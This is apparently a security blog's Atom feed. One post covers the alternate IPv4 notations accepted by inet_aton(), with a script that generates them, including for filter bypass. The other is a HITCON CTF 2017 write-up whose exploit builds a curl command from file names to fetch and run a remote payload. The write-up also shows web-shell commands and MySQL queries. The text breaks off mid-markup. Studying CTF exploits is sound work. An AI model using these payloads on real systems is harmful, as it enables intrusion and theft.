<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>findneo</title>
  
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="https://findneo.github.io/"/>
  <updated>2017-11-25T15:17:49.844Z</updated>
  <id>https://findneo.github.io/</id>
  
  <author>
    <name>findneo</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>IP地址的各种表示形式</title>
    <link href="https://findneo.github.io/2017/11/textual-representation-of-IPv4-addresses/"/>
    <id>https://findneo.github.io/2017/11/textual-representation-of-IPv4-addresses/</id>
    <published>2017-11-25T08:18:25.000Z</published>
    <updated>2017-11-25T15:17:49.844Z</updated>
    
    <content type="html"><![CDATA[<p>从上回看到<code>ping 127.1</code> 能正常工作开始，就一直很好奇背后的原因，最近又在 <a href="https://findneo.github.io/2017/11/HITCON-CTF-2017-Babyfirst-Revenge-series-writeup/">一个CTF题目</a> 用到基于IP表示法的技巧，于是决定稍微探索一下。</p><h3 id="概况"><a href="#概况" class="headerlink" title="概况"></a>概况</h3><p>IPv4是应用于分组交换网络的无状态协议，是网际协议(Internet Protocol , IP)的第四个版本，也是第一个投入生产的版本，1983年开始首先应用在ARPANET项目中。</p><p>IP地址用以标记使用IP接入网络的设备。IPv4把IP地址定义为32位二进制数，可表示 <code>2**32</code> 约42亿个网络设备接口，早期使用分类网络(Classful Addressing)的方法划分为五类，随着IP地址需求的增长，这种分类法被无类别域间路由(Classless Inter-Domain Routing , CIDR)取代。【参见RFC 1517-1519】</p><p> Classful Addressing：</p><table><thead><tr><th>Class</th><th>前缀位</th><th>网络地址位数</th><th>剩余的位数</th><th>网络数</th><th>每个网络的主机数</th></tr></thead><tbody><tr><td>A类地址（单播）</td><td>0</td><td>8</td><td>24</td><td>128</td><td>16,777,214</td></tr><tr><td>B类地址（单播）</td><td>10</td><td>16</td><td>16</td><td>16,384</td><td>65,534</td></tr><tr><td>C类地址（单播）</td><td>110</td><td>24</td><td>8</td><td>2,097,152</td><td>254</td></tr><tr><td>D类地址（<a href="https://zh.wikipedia.org/wiki/%E7%BE%A4%E6%92%AD" target="_blank" rel="external">群播</a>）</td><td>1110</td><td>未定义</td><td>未定义</td><td>未定义</td><td>未定义</td></tr><tr><td>E类地址（保留）</td><td>1111</td><td>未定义</td><td>未定义</td><td>未定义</td><td>未定义</td></tr></tbody></table><h3 id="IPv4-地址句法的历史与现状"><a href="#IPv4-地址句法的历史与现状" class="headerlink" title="IPv4 地址句法的历史与现状"></a>IPv4 地址句法的历史与现状</h3><p>一个IPv4地址除了被机器解析外，还会用在很多需要人类阅读理解的地方，而一个32位二进制数(如<code>11000000101010000100001011101001</code> )对人类是很不友好的，因此人们必然会需要某种文本描述(textual representation) 。我们现在最常见到的点分十进制表示法(dotted-decimal notation) 就是其一。什么是点分十进制呢？就是由点号分隔开的四个十进制数(如<code>192.168.66.233</code> ） ，其中每个十进制数表示一个字节(octets , 八位二进制数)，较高有效位在左，较低有效位在右。</p><p>尽管从上面的描述我们可以了解到IPv4地址的常见形式，但是关于IP地址的文本描述具体应该如何，似乎从来没有严谨全面的定义。另一方面，IP作为互联网中较为基础的设施之一，常常不可避免地出现在各种协议的描述里，这些描述有时顺带也会提及IP地址的写法，但提法不尽相同，也并不足够强硬和严谨。这篇 <a href="https://tools.ietf.org/html/draft-main-ipaddr-text-rep-02" target="_blank" rel="external">文章</a> 细数了一些RFC文档里出现过的描述 ，可以看到不同场景下出现过<code>#127.0.0.1</code> 、<code>[127.0.0.1]</code> 、<code>127.000.000.001</code> 等形式的写法。</p><p>当IETF版本的句法处于无意识发展时，BSD版本的句法悄然登场。一个权威的解释大概也不是那么重要，尤其是当一项技术的某种实现已经被广泛使用。对于IPv4地址而言，这个实现就是<code>4.2BSD</code> 。 <code>4.2BSD</code> 引入了名为<code>inet_aton()</code> 的用于将字符串解释为IP地址的函数，这个函数被广泛地复制和演绎，从而使得BSD版本的关于IP地址文本描述的句法成为了事实上的标准——能够被<code>inet_aton()</code> 解释即合标准。至于<code>inet_aton()</code> 接受哪些形式的IP地址，将在下文给出。</p><p>这里先简要谈谈这两种句法的异同。</p><h4 id="相同点"><a href="#相同点" class="headerlink" title="相同点"></a>相同点</h4><p>对于最大多数情况——不带前导0的点分十进制( <code>dotted decimal octets with leading zeroes suppressed</code> ) ，两者都是支持的。</p><h4 id="不同点"><a href="#不同点" class="headerlink" title="不同点"></a>不同点</h4><ul><li>BSD版本的许多句法IETF版本都不支持</li><li><strong><em>最重要的。</em></strong>IETF版本的句法在所有表述中始终如一地暗示要将带有前导0的数字解释为十进制，而BSD版本的句法在实现中将带有前导0的数字解释为八进制。举个例子，前者认为<code>192.168.1.011</code> 等价于<code>192.168.1.11</code> ，而后者认为等价于<code>192.168.1.9</code> 。</li></ul><p>值得一提的是IPv6 的发展也对此产生了一定的影响。IPv6中的函数<code>inet_pton()</code> 在处理IPv4地址时只接受点分十进制，并且明确地拒绝了一些能够被<code>inet_aton()</code> 接受的句法。然而，对于是否接受前导0语焉不详。</p><p>此外，2005年的RFC 3986 提出取两者安全的公共子集作为严格的IP地址句法定义，形成倾向于IETF的标准，但同时保持对BSD实现的后向兼容。这个子集的定义如下，简单说就是用点号分隔的四个十进制数，禁止使用前导0。</p><figure class="highlight python"><table><tr><td class="code"><pre><div class="line">A <span class="number">32</span>-bit IPv4 address <span class="keyword">is</span> divided into four octets.  Each octet <span class="keyword">is</span></div><div class="line">represented numerically <span class="keyword">in</span> decimal, using the minimum possible number</div><div class="line">of digits (leading zeroes are <span class="keyword">not</span> used, <span class="keyword">except</span> <span class="keyword">in</span> the case of <span class="number">0</span></div><div class="line">itself).  The four encoded octets are given most-significant first,</div><div class="line">separated by period characters.</div><div class="line"></div><div class="line">        IPv4address = d8 <span class="string">"."</span> d8 <span class="string">"."</span> d8 <span class="string">"."</span> d8</div><div class="line"></div><div class="line">        d8          = DIGIT               ; <span class="number">0</span><span class="number">-9</span></div><div class="line">                    / %x31<span class="number">-39</span> DIGIT       ; <span class="number">10</span><span class="number">-99</span></div><div class="line">                    / <span class="string">"1"</span> <span class="number">2</span>DIGIT          ; <span class="number">100</span><span class="number">-199</span></div><div class="line">                    / <span class="string">"2"</span> %x30<span class="number">-34</span> DIGIT   ; <span class="number">200</span><span class="number">-249</span></div><div class="line">                    / <span class="string">"25"</span> %x30<span class="number">-35</span>        ; <span class="number">250</span><span class="number">-255</span></div></pre></td></tr></table></figure><h3 id="inet-aton-允许哪些形式的IP地址"><a href="#inet-aton-允许哪些形式的IP地址" class="headerlink" title="inet_aton()允许哪些形式的IP地址"></a>inet_aton()允许哪些形式的IP地址</h3><blockquote><ul><li>a single number giving the entire 32-bit address.</li><li>dot-separated octet values.  </li><li>It also interpreted two intermediate syntaxes: <ul><li>octet-dot-octet-dot-16bits, intended for class B addresses</li><li>octet-dot-24bits, intended for class A addresses. </li></ul></li><li>It also allowed some flexibility in how the individual numeric parts were specified. it allowed octal and hexadecimal in addition to decimal, distinguishing these radices by using the C language syntax involving a prefix “0” or “0x”, and allowed the numbers to be arbitrarily long.</li></ul></blockquote><p>归纳起来有这么几种情况</p><ul><li>IP地址只有一个部分，表示为<code>a</code> ，每部分表示32位二进制数</li><li>IP地址有两个部分，表示为<code>a.b</code> ，<code>a</code> 表示8位二进制数，<code>b</code> 表示24位二进制数</li><li>IP地址有三部分，表示为<code>a.b.c</code> ，<code>a</code> 和<code>b</code> 各表示8位二进制数，<code>c</code> 表示16位二进制数</li><li>IP地址有四个部分，表示为<code>a.b.c.d</code> ，每部分表示8位二进制数</li></ul><p>以及这么两个重点</p><ul><li>每一个部分可以都有三种表示法，十进制、十六进制和八进制，用前缀表明进制。</li><li>每部分的数字可以是任意长度。</li></ul><p>到此为止，可以看到<code>127.1</code> 属于上述第二种情况，最开始的疑惑也就不复存在。</p><p>这应该算是一个历史遗留问题，不过在未来一段时间内，在广泛涉及URL和IP地址的浏览器和许多应用层程序(如Ping、telnet、wget、curl、GET、HEAD等)中，符合BSD版本句法的IPv4地址表示形式仍然是可接受的，而这些表示可以多达上百种，就可能在一些安全问题上发挥出人意料的作用。</p><h3 id="一个产生各种形式IP地址的脚本"><a href="#一个产生各种形式IP地址的脚本" class="headerlink" title="一个产生各种形式IP地址的脚本"></a>一个产生各种形式IP地址的脚本</h3><figure class="highlight python"><table><tr><td class="code"><pre><div class="line"><span class="comment"># coding:utf8</span></div><div class="line"><span class="comment"># by https://findneo.github.io/</span></div><div class="line"><span class="comment"># ref: https://linux.die.net/man/3/inet_aton</span></div><div class="line"><span class="comment">#      https://tools.ietf.org/html/draft-main-ipaddr-text-rep-02</span></div><div class="line"><span class="comment">#      https://tools.ietf.org/html/rfc3986</span></div><div class="line"><span class="comment">#      http://www.linuxsa.org.au/pipermail/linuxsa/2007-September/088131.html</span></div><div class="line"><span class="keyword">import</span> itertools <span class="keyword">as</span> it</div><div class="line">ip = <span class="string">'192.168.66.233'</span></div><div class="line">i = ip.split(<span class="string">'.'</span>)</div><div class="line"></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">f</span><span class="params">(x)</span>:</span></div><div class="line">    <span class="string">"""将str型十进制数转为str型十六进制数，并高位补0至满2字节，如'10'-&gt;'0x0a'</span></div><div class="line"><span class="string">    """</span></div><div class="line">    <span class="keyword">return</span> hex(int(x))[<span class="number">2</span>:].zfill(<span class="number">2</span>)</div><div class="line"></div><div class="line"></div><div class="line">hi = [f(i[<span class="number">0</span>]),</div><div class="line">      f(i[<span class="number">1</span>]),</div><div class="line">      f(i[<span class="number">2</span>]),</div><div class="line">      f(i[<span class="number">3</span>]),</div><div class="line">      <span class="comment"># hi[4]:part c of "a.b.c"</span></div><div class="line">      f(i[<span class="number">2</span>]) + f(i[<span class="number">3</span>]),</div><div class="line">      <span class="comment"># hi[5]:part b of "a.b"</span></div><div class="line">      f(i[<span class="number">1</span>]) + f(i[<span class="number">2</span>]) + f(i[<span class="number">3</span>]),</div><div class="line">      <span class="comment"># hi[6]:'a'</span></div><div class="line">      f(i[<span class="number">0</span>]) + f(i[<span class="number">1</span>]) + f(i[<span class="number">2</span>]) + f(i[<span class="number">3</span>]),</div><div class="line">      ]</div><div class="line"></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">hex2oct</span><span class="params">(x)</span>:</span></div><div class="line">    <span class="string">"""可在八进制高位补任意多个0以bypass某些过滤，</span></div><div class="line"><span class="string">        当然，也要考虑一些其他的限制，比如命令行长度限制</span></div><div class="line"><span class="string">    """</span></div><div class="line">    moreZero = <span class="number">0</span></div><div class="line">    <span class="keyword">return</span> oct(int(x, <span class="number">16</span>)).zfill(moreZero + len(oct(int(x, <span class="number">16</span>)))).strip(<span class="string">'L'</span>)</div><div class="line"></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">hex2int</span><span class="params">(x)</span>:</span> <span class="keyword">return</span> str(int(x, <span class="number">16</span>))</div><div class="line"></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">hex2hex</span><span class="params">(x)</span>:</span> <span class="keyword">return</span> <span class="string">'0x'</span> + x</div><div class="line"></div><div class="line"></div><div class="line">p = [hex2hex, hex2int, hex2oct]</div><div class="line">res = []</div><div class="line"><span class="comment"># "a.b.c.d"</span></div><div class="line"><span class="comment"># Each of the four numeric parts specifies a byte of the address;</span></div><div class="line"><span class="comment"># the bytes are assigned in left-to-right order to produce the binary address.</span></div><div class="line">res.extend([<span class="string">'.'</span>.join([i[<span class="number">0</span>](hi[<span class="number">0</span>]), i[<span class="number">1</span>](hi[<span class="number">1</span>]), i[<span class="number">2</span>](hi[<span class="number">2</span>]), i[<span class="number">3</span>](hi[<span class="number">3</span>])]) <span class="keyword">for</span> i <span class="keyword">in</span> it.product(p, p, p, p)])</div><div class="line"></div><div class="line"><span class="comment"># "a.b.c"</span></div><div class="line"><span class="comment"># Parts a and b specify the first two bytes of the binary address.</span></div><div class="line"><span class="comment"># Part c is interpreted as a 16-bit value that defines the rightmost two bytes of the binary address.</span></div><div class="line">res.extend([<span class="string">'.'</span>.join([i[<span class="number">0</span>](hi[<span class="number">0</span>]), i[<span class="number">1</span>](hi[<span class="number">1</span>]), i[<span class="number">2</span>](hi[<span class="number">4</span>])]) <span class="keyword">for</span> i <span class="keyword">in</span> it.product(p, p, p)])</div><div class="line"></div><div class="line"><span class="comment"># "a.b"</span></div><div class="line"><span class="comment"># Part a specifies the first byte of the binary address.</span></div><div class="line"><span class="comment"># Part b is interpreted as a 24-bit value that defines the rightmost three bytes of the binary address.</span></div><div class="line">res.extend([<span class="string">'.'</span>.join([i[<span class="number">0</span>](hi[<span class="number">0</span>]), i[<span class="number">1</span>](hi[<span class="number">5</span>])]) <span class="keyword">for</span> i <span class="keyword">in</span> it.product(p, p)])</div><div class="line"></div><div class="line"><span class="comment"># "a"</span></div><div class="line"><span class="comment"># The value a is interpreted as a 32-bit value that is stored directly into the binary address without any byte rearrangement.</span></div><div class="line">res.extend([<span class="string">'.'</span>.join([i[<span class="number">0</span>](hi[<span class="number">6</span>])]) <span class="keyword">for</span> i <span class="keyword">in</span> it.product(p)])</div><div class="line"><span class="keyword">print</span> res</div><div class="line"></div><div class="line"><span class="comment"># -------------------------------------------------------------------------------</span></div><div class="line"><span class="comment"># test</span></div><div class="line"><span class="keyword">import</span> os</div><div class="line"></div><div class="line">except_ip = []</div><div class="line"></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">test_notation</span><span class="params">(ip_notation)</span>:</span></div><div class="line">    <span class="keyword">global</span> except_ip</div><div class="line">    x = os.popen(<span class="string">'ping -n 1 -w 0.5 '</span> + ip_notation).readlines()</div><div class="line">    answer = x[<span class="number">0</span>] <span class="keyword">if</span> len(x) == <span class="number">1</span> <span class="keyword">else</span> x[<span class="number">1</span>]</div><div class="line">    <span class="keyword">if</span> ip <span class="keyword">not</span> <span class="keyword">in</span> answer:</div><div class="line">        except_ip.append(ip_notation)</div><div class="line">    <span class="keyword">return</span> answer.decode(<span class="string">'gbk'</span>).strip()</div><div class="line"></div><div class="line"></div><div class="line"><span class="keyword">print</span> <span class="string">"\nchecking. . ."</span>,</div><div class="line"><span class="keyword">for</span> i <span class="keyword">in</span> xrange(len(res)):</div><div class="line">    <span class="comment"># print "[%d] %s\t\t\t%s" % (i, res[i], test_notation(res[i]))</span></div><div class="line">    test_notation(res[i])</div><div class="line">    <span class="keyword">print</span> <span class="string">'.'</span>,</div><div class="line"></div><div class="line"><span class="keyword">print</span> <span class="string">"\n\ntotally %d notations of ip checked ,all are equivalent to %s"</span> % (len(res), ip)</div><div class="line"><span class="keyword">if</span> len(except_ip):</div><div class="line">    <span class="keyword">print</span> <span class="string">"except for notations following:\n"</span>, except_ip</div></pre></td></tr></table></figure><p>运行结果</p><figure class="highlight python"><table><tr><td class="code"><pre><div class="line">[<span class="string">'0xc0.0xa8.0x42.0xe9'</span>, <span class="string">'0xc0.0xa8.0x42.233'</span>, <span class="string">'0xc0.0xa8.0x42.0351'</span>, <span class="string">'0xc0.0xa8.66.0xe9'</span>, <span class="string">'0xc0.0xa8.66.233'</span>, <span class="string">'0xc0.0xa8.66.0351'</span>, <span class="string">'0xc0.0xa8.0102.0xe9'</span>, <span class="string">'0xc0.0xa8.0102.233'</span>, <span class="string">'0xc0.0xa8.0102.0351'</span>, <span class="string">'0xc0.168.0x42.0xe9'</span>, <span class="string">'0xc0.168.0x42.233'</span>, <span class="string">'0xc0.168.0x42.0351'</span>, <span class="string">'0xc0.168.66.0xe9'</span>, <span class="string">'0xc0.168.66.233'</span>, <span class="string">'0xc0.168.66.0351'</span>, <span class="string">'0xc0.168.0102.0xe9'</span>, <span class="string">'0xc0.168.0102.233'</span>, <span class="string">'0xc0.168.0102.0351'</span>, <span class="string">'0xc0.0250.0x42.0xe9'</span>, <span class="string">'0xc0.0250.0x42.233'</span>, <span class="string">'0xc0.0250.0x42.0351'</span>, <span class="string">'0xc0.0250.66.0xe9'</span>, <span class="string">'0xc0.0250.66.233'</span>, <span class="string">'0xc0.0250.66.0351'</span>, <span class="string">'0xc0.0250.0102.0xe9'</span>, <span class="string">'0xc0.0250.0102.233'</span>, <span class="string">'0xc0.0250.0102.0351'</span>, <span class="string">'192.0xa8.0x42.0xe9'</span>, <span class="string">'192.0xa8.0x42.233'</span>, <span class="string">'192.0xa8.0x42.0351'</span>, <span class="string">'192.0xa8.66.0xe9'</span>, <span class="string">'192.0xa8.66.233'</span>, <span class="string">'192.0xa8.66.0351'</span>, <span class="string">'192.0xa8.0102.0xe9'</span>, <span class="string">'192.0xa8.0102.233'</span>, <span class="string">'192.0xa8.0102.0351'</span>, <span class="string">'192.168.0x42.0xe9'</span>, <span class="string">'192.168.0x42.233'</span>, <span class="string">'192.168.0x42.0351'</span>, <span class="string">'192.168.66.0xe9'</span>, <span class="string">'192.168.66.233'</span>, <span class="string">'192.168.66.0351'</span>, <span class="string">'192.168.0102.0xe9'</span>, <span class="string">'192.168.0102.233'</span>, <span class="string">'192.168.0102.0351'</span>, <span class="string">'192.0250.0x42.0xe9'</span>, <span class="string">'192.0250.0x42.233'</span>, <span class="string">'192.0250.0x42.0351'</span>, <span class="string">'192.0250.66.0xe9'</span>, <span class="string">'192.0250.66.233'</span>, <span class="string">'192.0250.66.0351'</span>, <span class="string">'192.0250.0102.0xe9'</span>, <span class="string">'192.0250.0102.233'</span>, <span class="string">'192.0250.0102.0351'</span>, <span class="string">'0300.0xa8.0x42.0xe9'</span>, <span class="string">'0300.0xa8.0x42.233'</span>, <span class="string">'0300.0xa8.0x42.0351'</span>, <span class="string">'0300.0xa8.66.0xe9'</span>, <span class="string">'0300.0xa8.66.233'</span>, <span class="string">'0300.0xa8.66.0351'</span>, <span class="string">'0300.0xa8.0102.0xe9'</span>, <span class="string">'0300.0xa8.0102.233'</span>, <span class="string">'0300.0xa8.0102.0351'</span>, <span class="string">'0300.168.0x42.0xe9'</span>, <span class="string">'0300.168.0x42.233'</span>, <span class="string">'0300.168.0x42.0351'</span>, <span class="string">'0300.168.66.0xe9'</span>, <span class="string">'0300.168.66.233'</span>, <span class="string">'0300.168.66.0351'</span>, <span class="string">'0300.168.0102.0xe9'</span>, <span class="string">'0300.168.0102.233'</span>, <span class="string">'0300.168.0102.0351'</span>, <span class="string">'0300.0250.0x42.0xe9'</span>, <span class="string">'0300.0250.0x42.233'</span>, <span class="string">'0300.0250.0x42.0351'</span>, <span class="string">'0300.0250.66.0xe9'</span>, <span class="string">'0300.0250.66.233'</span>, <span class="string">'0300.0250.66.0351'</span>, <span class="string">'0300.0250.0102.0xe9'</span>, <span class="string">'0300.0250.0102.233'</span>, <span class="string">'0300.0250.0102.0351'</span>, <span class="string">'0xc0.0xa8.0x42e9'</span>, <span class="string">'0xc0.0xa8.17129'</span>, <span class="string">'0xc0.0xa8.041351'</span>, <span class="string">'0xc0.168.0x42e9'</span>, <span class="string">'0xc0.168.17129'</span>, <span class="string">'0xc0.168.041351'</span>, <span class="string">'0xc0.0250.0x42e9'</span>, <span class="string">'0xc0.0250.17129'</span>, <span class="string">'0xc0.0250.041351'</span>, <span class="string">'192.0xa8.0x42e9'</span>, <span class="string">'192.0xa8.17129'</span>, <span class="string">'192.0xa8.041351'</span>, <span class="string">'192.168.0x42e9'</span>, <span class="string">'192.168.17129'</span>, <span class="string">'192.168.041351'</span>, <span class="string">'192.0250.0x42e9'</span>, <span class="string">'192.0250.17129'</span>, <span class="string">'192.0250.041351'</span>, <span class="string">'0300.0xa8.0x42e9'</span>, <span class="string">'0300.0xa8.17129'</span>, <span class="string">'0300.0xa8.041351'</span>, <span class="string">'0300.168.0x42e9'</span>, <span class="string">'0300.168.17129'</span>, <span class="string">'0300.168.041351'</span>, <span class="string">'0300.0250.0x42e9'</span>, <span class="string">'0300.0250.17129'</span>, <span class="string">'0300.0250.041351'</span>, <span class="string">'0xc0.0xa842e9'</span>, <span class="string">'0xc0.11027177'</span>, <span class="string">'0xc0.052041351'</span>, <span class="string">'192.0xa842e9'</span>, <span class="string">'192.11027177'</span>, <span class="string">'192.052041351'</span>, <span class="string">'0300.0xa842e9'</span>, <span class="string">'0300.11027177'</span>, <span class="string">'0300.052041351'</span>, <span class="string">'0xc0a842e9'</span>, <span class="string">'3232252649'</span>, <span class="string">'030052041351'</span>]</div><div class="line"></div><div class="line">checking. . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . </div><div class="line"></div><div class="line">totally <span class="number">120</span> notations of ip checked ,all are equivalent to <span class="number">192.168</span><span class="number">.66</span><span class="number">.233</span></div><div class="line">[Finished <span class="keyword">in</span> <span class="number">2.6</span>s]</div></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      一个IP地址，可能有上百种面目
    
    </summary>
    
      <category term="备忘" scheme="https://findneo.github.io/categories/%E5%A4%87%E5%BF%98/"/>
    
    
      <category term="网络" scheme="https://findneo.github.io/tags/%E7%BD%91%E7%BB%9C/"/>
    
  </entry>
  
  <entry>
    <title>HITCON CTF 2017 BabyFirst Revenge &amp; v2 writeup</title>
    <link href="https://findneo.github.io/2017/11/HITCON-CTF-2017-Babyfirst-Revenge-series-writeup/"/>
    <id>https://findneo.github.io/2017/11/HITCON-CTF-2017-Babyfirst-Revenge-series-writeup/</id>
    <published>2017-11-12T09:14:27.000Z</published>
    <updated>2017-11-25T15:22:18.674Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>from HITCON CTF 2017<br>2017/11/04 02:00 UTC ~ 2017/11/06 02:00 UTC</p><p><a href="https://ctf2017.hitcon.org/" target="_blank" rel="external">https://ctf2017.hitcon.org/</a></p></blockquote><h3 id="BabyFirst-Revenge"><a href="#BabyFirst-Revenge" class="headerlink" title="BabyFirst Revenge"></a>BabyFirst Revenge</h3><blockquote><p>Do you remember <a href="https://github.com/orangetw/My-CTF-Web-Challenges#babyfirst" target="_blank" rel="external">BabyFirst</a> from HITCON CTF 2015?</p><p>This is the harder version!</p><p><a href="http://52.199.204.34/" target="_blank" rel="external">http://52.199.204.34/</a></p></blockquote><h4 id="源码"><a href="#源码" class="headerlink" title="源码"></a>源码</h4><figure class="highlight php"><table><tr><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line">    $sandbox = <span class="string">'/www/sandbox/'</span> . md5(<span class="string">"orange"</span> . $_SERVER[<span class="string">'REMOTE_ADDR'</span>]);</div><div class="line">    @mkdir($sandbox);</div><div class="line">    @chdir($sandbox);</div><div class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'cmd'</span>]) &amp;&amp; strlen($_GET[<span class="string">'cmd'</span>]) &lt;= <span class="number">5</span>) &#123;</div><div class="line">        @exec($_GET[<span class="string">'cmd'</span>]);</div><div class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'reset'</span>])) &#123;</div><div class="line">        @exec(<span class="string">'/bin/rm -rf '</span> . $sandbox);</div><div class="line">    &#125;</div><div class="line">    highlight_file(<span class="keyword">__FILE__</span>);</div></pre></td></tr></table></figure><h4 id="解法"><a href="#解法" class="headerlink" title="解法"></a>解法</h4><p>详细说明：<a href="http://bobao.360.cn/ctf/detail/214.html" target="_blank" rel="external">http://bobao.360.cn/ctf/detail/214.html</a></p><p>拿到shell后在<code>/home/fl4444g/README.txt</code>  得到数据库配置信息，然后连接数据库得到flag。</p><figure class="highlight python"><table><tr><td class="code"><pre><div class="line">http://52.199.204.34/sandbox/___MD5___of___ip/shell.php?cmd=cat%20/home/fl4444g/README.txt</div><div class="line"><span class="comment">#    Flag is in the MySQL database</span></div><div class="line"><span class="comment">#fl4444g / SugZXUtgeJ52_Bvr</span></div><div class="line"></div><div class="line">http://52.199.204.34/sandbox/___MD5___of___ip/fun.php?cmd=mysql -ufl4444g -pSugZXUtgeJ52_Bvr -e "show databases;"</div><div class="line"><span class="comment">#    Database</span></div><div class="line"><span class="comment">#information_schema</span></div><div class="line"><span class="comment">#fl4gdb</span></div><div class="line"></div><div class="line">http://52.199.204.34/sandbox/___MD5___of___ip/fun.php?cmd=mysql -ufl4444g -pSugZXUtgeJ52_Bvr -e "select concat(table_name) from information_schema.tables where table_schema='fl4gdb';"</div><div class="line"><span class="comment">#    concat(table_name)</span></div><div class="line"><span class="comment">#this_is_the_fl4g</span></div><div class="line"></div><div class="line">http://52.199.204.34/sandbox/___MD5___of___ip/fun.php?cmd=mysql -ufl4444g -pSugZXUtgeJ52_Bvr -e "use fl4gdb;select * from this_is_the_fl4g"</div><div class="line"><span class="comment">#    secret</span></div><div class="line"><span class="comment">#hitcon&#123;idea_from_phith0n,thank_you:)&#125;</span></div></pre></td></tr></table></figure><p><img src="getFlag.png" alt=""></p><h4 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h4><figure class="highlight python"><table><tr><td class="code"><pre><div class="line"><span class="comment"># by https://findneo.github.io/</span></div><div class="line"><span class="keyword">import</span> requests <span class="keyword">as</span> r</div><div class="line"><span class="keyword">import</span> hashlib</div><div class="line">url = <span class="string">'http://52.199.204.34/'</span></div><div class="line"><span class="comment"># 查询自己的IP</span></div><div class="line">ip = r.get(<span class="string">'http://ipv4.icanhazip.com/'</span>).text.strip()</div><div class="line">sandbox = url + <span class="string">'sandbox/'</span> + hashlib.md5(<span class="string">'orange'</span> + ip).hexdigest() + <span class="string">'/'</span></div><div class="line"></div><div class="line">reset = url + <span class="string">'?reset'</span></div><div class="line">cmd = url + <span class="string">'?cmd='</span></div><div class="line">build = [<span class="string">'&gt;cur\\'</span>,</div><div class="line">         <span class="string">'&gt;l\ \\'</span>,</div><div class="line">         <span class="string">'ls&gt;A'</span>,</div><div class="line">         <span class="string">'rm c*'</span>,</div><div class="line">         <span class="string">'rm l*'</span>,</div><div class="line">         <span class="string">'&gt;105\\'</span>,</div><div class="line">         <span class="string">'&gt;304\\'</span>,</div><div class="line">         <span class="string">'&gt;301\\'</span>,</div><div class="line">         <span class="string">'&gt;9\&gt;\\'</span>,</div><div class="line">         <span class="string">'ls&gt;&gt;A'</span>,</div><div class="line">         <span class="string">'sh A'</span>,</div><div class="line">         <span class="string">'php A'</span></div><div class="line">         ]</div><div class="line"><span class="comment"># 如果目标服务器有GET，这个也是可以打的</span></div><div class="line"><span class="comment"># build = ['&gt;GE\\',</span></div><div class="line"><span class="comment">#          '&gt;T\\ \\',</span></div><div class="line"><span class="comment">#          'ls&gt;A',</span></div><div class="line"><span class="comment">#          'rm G*',</span></div><div class="line"><span class="comment">#          'rm T*',</span></div><div class="line"><span class="comment">#          '&gt;105\\',</span></div><div class="line"><span class="comment">#          '&gt;304\\',</span></div><div class="line"><span class="comment">#          '&gt;301\\',</span></div><div class="line"><span class="comment">#          '&gt;9\&gt;\\',</span></div><div class="line"><span class="comment">#          'ls&gt;&gt;A']</span></div><div class="line">r.get(reset)</div><div class="line"><span class="keyword">for</span> i <span class="keyword">in</span> build:</div><div class="line">    s = r.get(cmd + i)</div><div class="line">    <span class="keyword">print</span> <span class="string">'[%s]'</span> % s.status_code, s.url</div><div class="line"></div><div class="line">s = r.get(sandbox + <span class="string">'fun.php?cmd=uname -a'</span>)</div><div class="line"><span class="keyword">print</span> <span class="string">'\n'</span> + <span class="string">'[%s]'</span> % s.status_code, s.url</div><div class="line"><span class="keyword">print</span> s.text</div></pre></td></tr></table></figure><h4 id="更多解答"><a href="#更多解答" class="headerlink" title="更多解答"></a>更多解答</h4><p><a href="https://github.com/orangetw/My-CTF-Web-Challenges#babyfirst-revenge" target="_blank" rel="external">https://github.com/orangetw/My-CTF-Web-Challenges#babyfirst-revenge</a></p><h3 id="BabyFirst-Revenge-v2"><a href="#BabyFirst-Revenge-v2" class="headerlink" title="BabyFirst Revenge v2"></a>BabyFirst Revenge v2</h3><blockquote><p>BabyFirst Revenge v2<br>This is the hardest version! Short enough?</p><p><a href="http://52.197.41.31/" target="_blank" rel="external">http://52.197.41.31/</a></p></blockquote><h4 id="源码-1"><a href="#源码-1" class="headerlink" title="源码"></a>源码</h4><figure class="highlight php"><table><tr><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line">    $sandbox = <span class="string">'/www/sandbox/'</span> . md5(<span class="string">"orange"</span> . $_SERVER[<span class="string">'REMOTE_ADDR'</span>]);</div><div class="line">    @mkdir($sandbox);</div><div class="line">    @chdir($sandbox);</div><div class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'cmd'</span>]) &amp;&amp; strlen($_GET[<span class="string">'cmd'</span>]) &lt;= <span class="number">4</span>) &#123;</div><div class="line">        @exec($_GET[<span class="string">'cmd'</span>]);</div><div class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'reset'</span>])) &#123;</div><div class="line">        @exec(<span class="string">'/bin/rm -rf '</span> . $sandbox);</div><div class="line">    &#125;</div><div class="line">    highlight_file(<span class="keyword">__FILE__</span>);</div></pre></td></tr></table></figure><h4 id="解法-1"><a href="#解法-1" class="headerlink" title="解法"></a>解法</h4><p>这题是赛后看wp复现的，只到拿webshell的部分。</p><p>详细说明： <a href="http://bobao.360.cn/ctf/detail/214.html" target="_blank" rel="external">http://bobao.360.cn/ctf/detail/214.html</a></p><h4 id="EXP-1"><a href="#EXP-1" class="headerlink" title="EXP"></a>EXP</h4><figure class="highlight python"><table><tr><td class="code"><pre><div class="line"><span 